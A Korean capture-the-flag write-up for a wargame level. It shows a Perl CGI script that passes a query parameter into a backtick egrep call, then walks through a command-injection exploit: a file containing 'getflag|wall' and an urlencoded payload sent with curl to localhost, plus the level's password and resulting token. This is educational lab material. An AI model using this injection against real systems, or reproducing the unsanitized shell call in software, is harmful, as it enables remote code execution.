> Password: fa6v5ateaw21peobuub8ipe6s

# 접근 방법

홈 디렉토리의 `level12.pl`파일을 보면

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

`4646`번 포트에서 `CGI`가 작동중인데, `x`라는 쿼리 파라미터로 들어온 값을 
```perl
$xx =~ tr/a-z/A-Z/; # 소문자 -> 대문자로 변경
```
```perl
$xx =~ s/\s.*//; # 공백이 존재할 경우 공백과 그 뒤의 내용을 전부 제거
```
정규식으로 처리를 거친 후 결과 문자열을 패턴으로 사용해 `egrep`으로 `/tmp/xd`파일에 적용한 결과가 `y`쿼리 파라미터의 값과 같은지 비교하여 `..`이나 `.`을 출력해주는 프로그램인 것을 볼 수 있다.

이때 대문자 변경, 공백 제거라는 빈약한 입력 검증 이후에 값을 그대로 shell으로 평가한다는 점을 이용해서

`/tmp/xd` 파일에 `getflag|wall`을 넣어주고

쿼리 파라미터 `x`에 `"<a;."`라는 내용을 `urlencode`하여 넣어주면
쉘에서 평가되는 부분이

```perl
@output = `egrep "^"<a;."" /tmp/xd 2>&1`;
```
으로 바뀌게 되면서, 결과적으로 `/tmp/xd`의 내용을 쉘 스크립트로 취급하여 실행하라는 의미가 되면서 `token`을 얻을 수 있다. 


```bash
$ echo "getflag|wall" > /tmp/xd
$ curl 127.0.0.1:4646?x=%22%3Ca%3B.%22


Broadcast Message from flag12@Snow
        (somewhere) at 22:21 ...

Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr

..
```